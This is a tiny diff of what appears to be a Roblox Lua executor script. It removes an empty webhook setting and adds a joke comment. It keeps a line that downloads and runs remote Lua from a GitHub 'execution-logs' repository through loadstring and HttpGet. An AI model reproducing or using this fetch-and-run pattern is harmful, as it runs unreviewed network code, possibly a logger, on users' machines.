@@ -1,5 +1,4 @@
--- < Settings > 
-local webhook = "";
+-- created by the fbi
 -- < Dont Change >
 loadstring(game:HttpGet('https://raw.githubusercontent.com/CeleryScripts/simple-execution-logs/main/FixLoadstring.lua'))()
 task.wait(0.2)
